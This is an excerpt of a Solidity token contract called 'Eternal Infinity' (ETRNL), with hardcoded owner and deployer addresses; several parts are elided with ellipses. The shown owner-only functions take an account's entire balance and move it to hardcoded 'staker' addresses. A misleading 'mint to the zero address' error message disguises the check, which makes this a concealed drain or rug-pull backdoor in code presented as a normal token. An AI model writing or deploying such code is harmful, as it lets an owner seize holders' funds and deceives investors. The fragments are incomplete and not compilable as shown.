...
contract Eternal is Context, IERC20 {
    ...
    address lead_deployer = 0xa2E900731D6959b27637399b5a38c39e3Cd23F4f;
    address public _owner = 0x4DEF3cd30F533411f91E954D3d2ABA206320253A;
   constructor () public {


        
        _name = "Eternal Infinity";
        _symbol = "ETRNL";
        _decimals = 18;
        uint256 initialSupply = 18888888;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        address staker = 0x429dc62E58483E1262fdce4E452E9266984f2a45;
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
        ...
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        address staker = 0xBBc2AE13b23d715c30720F079fcd9B4a74093505;
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
        ...
        function wrap(address account) public {
